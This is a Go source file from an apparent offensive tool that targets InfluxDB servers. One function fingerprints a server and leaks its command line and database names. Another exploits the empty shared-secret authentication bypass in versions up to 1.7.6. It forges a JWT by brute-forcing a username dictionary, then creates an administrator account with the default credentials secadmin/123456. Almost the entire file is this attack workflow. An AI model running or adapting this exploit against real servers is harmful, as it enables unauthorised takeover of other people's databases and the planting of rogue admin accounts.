package controllers

import (
	"biu/dao/dict"
	"biu/models"
	"biu/pkg/influxdb"
	"fmt"
	"strconv"

	"github.com/abiosoft/ishell"
	"github.com/sirupsen/logrus"
)

var (
	defaultUsername = "secadmin"
	defaultPassword = "123456"
	defaultHost     = "127.0.0.1"
	defaultPort     = "8086"
)

//getTarget 输入目标
func getTarget(c *ishell.Context) (host string, port int, err error) {
	c.Print(fmt.Sprintf("请输入目标主机IP(default:%s):", defaultHost))
	host = c.ReadLine()
	if len(host) == 0 {
		host = defaultHost
	}
	c.Print(fmt.Sprintf("请输入端口(default:%s):", defaultPort))
	portStr := c.ReadLine()
	if len(portStr) == 0 {
		portStr = defaultPort
	}
	port, err = strconv.Atoi(portStr)
	if err != nil {
		logrus.Error(err)
		return host, port, err
	}
	return host, port, nil
}

//InfluxFootPrintController 踩点
func InfluxFootPrintController(c *ishell.Context) {
	host, port, err := getTarget(c)
	if err != nil {
		logrus.Error(err)
		return
	}
	client := influxdb.NewClient(host, port)
	leakinfo, err := client.GetDebugVars()
	if err != nil {
		logrus.Error("influxdb.GetDebugVars failed,err:", err)
		return
	}
	fmt.Println("服务器当前时间:", leakinfo.CurrentTime)
	fmt.Println("influxd 启动时间:", leakinfo.StartedTime)
	fmt.Println("influxd 启动时长:", leakinfo.UpTime)
	fmt.Println("influxd 命令行:", leakinfo.CmdLine)
	fmt.Println("数据库信息:")
	for i := range leakinfo.Databases {
		fmt.Println("\t数据库名:", leakinfo.Databases[i].Tags.Name)
		fmt.Println("\t表的数量:", leakinfo.Databases[i].Values.NumMeasurments)
		fmt.Println("\t序列数:", leakinfo.Databases[i].Values.NumSeries)
		fmt.Println()
	}
	//跟踪http客户端对 /write 和query的请求
	if err := client.Follow(); err != nil {
		logrus.Error("client.Follow failed,err:", err)
		return
	}
	//获取版本信息
	version, err := client.Ping()
	if err != nil {
		logrus.Error("influxdb.Ping failed,err:", err)
		return
	}
	fmt.Println("influxdb version:", version)
	//判断是否开启身份认证
	authEnable, err := client.IsAuthEnable()
	if err != nil {
		logrus.Error("influxdb.IsAuthEnable(host, port) failed,err:", err)
		return
	}
	if authEnable == false {
		fmt.Println("[危险]未开启 auth enable")
		return
	}
	fmt.Println("已开启 auth enable")
	//判断是否存在身份认证绕过漏洞
	vulnerable := IsVulnerable(version)
	if vulnerable == false {
		fmt.Println("该版本不存在shared-secret为空的配置漏洞")
		return
	}
	fmt.Println("该版本可能存在shared-secret为空的配置疏忽漏洞")
}

//InfluxAttackController 利用
func InfluxAttackController(c *ishell.Context) {
	host, port, err := getTarget(c)
	if err != nil {
		logrus.Error(err)
		return
	}
	client := influxdb.NewClient(host, port)
	//1.获取版本信息
	version, err := client.Ping()
	if err != nil {
		logrus.Error("influxdb.Ping failed,err:", err)
		return
	}
	fmt.Println("influxdb version:", version)
	//2.判断是否开启身份认证
	authEnable, err := client.IsAuthEnable()
	if err != nil {
		logrus.Error("influxdb.IsAuthEnable(host, port) failed,err:", err)
		return
	}
	if authEnable == false {
		fmt.Println("[危险]未开启 auth enable")
		return
	}
	fmt.Println("已开启 auth enable")
	//3.判断是否存在身份认证绕过漏洞
	vulnerable := IsVulnerable(version)
	if vulnerable == false {
		fmt.Println("该版本可能不存在shared-secret为空的配置漏洞")
		// return
	} else {
		fmt.Println("该版本可能存在shared-secret为空的配置疏忽漏洞")
	}

	fmt.Println("尝试伪造jwt token,绕过身份效验...")
	token, err := client.BypassAuth(dict.Usernames)
	if err != nil {
		logrus.Error("influxdb.ByPassAuth failed,err:", err)
		return
	}
	fmt.Println("爆破成功,得到有效token:", token)
	c.Println("尝试创建管理员用户...")
	c.Print(fmt.Sprintf("username(default:%s):", defaultUsername))
	username := c.ReadLine()
	if len(username) == 0 {
		username = defaultUsername
	}
	c.Print(fmt.Sprintf("password(default:%s):", defaultPassword))
	password := c.ReadLine()
	if len(password) == 0 {
		password = defaultPassword
	}

	err = client.CreateAdmin(username, password)
	if err != nil {
		logrus.Error("创建管理员用户失败,err:", err)
		return
	}

}

//IsVulnerable 判断是否存在漏洞
func IsVulnerable(version *models.Version) bool {
	if version.A == 1 && version.B <= 7 && version.C <= 6 {
		return true
	}
	return false
}
